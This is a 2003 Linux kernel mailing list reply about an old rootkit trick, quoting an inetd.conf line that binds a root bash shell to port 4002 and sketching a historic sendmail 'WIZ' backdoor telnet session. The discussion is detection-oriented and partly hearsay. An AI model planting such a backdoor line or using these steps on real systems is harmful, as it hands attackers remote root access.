Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S265398AbTLHNtM (ORCPT <rfc822;willy@w.ods.org>);
	Mon, 8 Dec 2003 08:49:12 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S265403AbTLHNtM
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 8 Dec 2003 08:49:12 -0500
Received: from chaos.analogic.com ([204.178.40.224]:18308 "EHLO
	chaos.analogic.com") by vger.kernel.org with ESMTP id S265398AbTLHNtI
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 8 Dec 2003 08:49:08 -0500
Date: Mon, 8 Dec 2003 08:49:29 -0500 (EST)
From: "Richard B. Johnson" <root@chaos.analogic.com>
X-X-Sender: root@chaos
Reply-To: root@chaos.analogic.com
To: Samium Gromoff <deepfire@ibe.miee.ru>
cc: Linux kernel <linux-kernel@vger.kernel.org>
Subject: Re: [OT] Rootkit queston
In-Reply-To: <874qwehxf1.wl@drakkar.ibe.miee.ru>
Message-ID: <Pine.LNX.4.53.0312080836550.28061@chaos>
References: <874qwehxf1.wl@drakkar.ibe.miee.ru>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Sat, 6 Dec 2003, Samium Gromoff wrote:

>
> On Mon, 1 Dec 2003, Richard B. Johnson wrote:
> > You can check for a common 'root attack', if you have inetd,
> > by looking at the last few lines in /etc/inetd.conf.
> > It may have some access port added that allows anybody
> > who knows about it to log in as root from the network.
> > It will look something like this:
> >
> > # End of inetd.conf.
> > 4002 stream tcp nowait root /bin/bash --
> >
> > In this case, port 4002 will allow access to a root shell
> > that has no terminal processing, but an attacker can use this
> > to get complete control of your system. FYI, this is a 5-year-old
> > attack, long obsolete if you have a "store-bought" distribution
> > more recent.
>
> How is it an attack?
> 	(in order to write to inetd.conf you need to be root already)
>
> And if it is, what does it accomplish?
> 	(writing a daemon listening on a $BELOVED_PORT port is trivial)
>
> regards, Samium Gromoff
>

The explaination I read about on the web was that inetd had a
developer's "back-door". If you knew about it, you could write
to inetd.conf, which had been opened r/w. Other back doors existed
in other network daemons also. The first exposed one was in
sendmail. You could do:
		telnet dumb.victum.com 25
		victum.com Sendmail 1.2.0 ready at Mon, Dec 4 1998
08:00:00 -0500
		WIZ
		220 Oh great leader.
		#

.... and you had a root-shell.

Cheers,
Dick Johnson
Penguin : Linux version 2.4.22 on an i686 machine (797.90 BogoMips).
            Note 96.31% of all statistics are fiction.


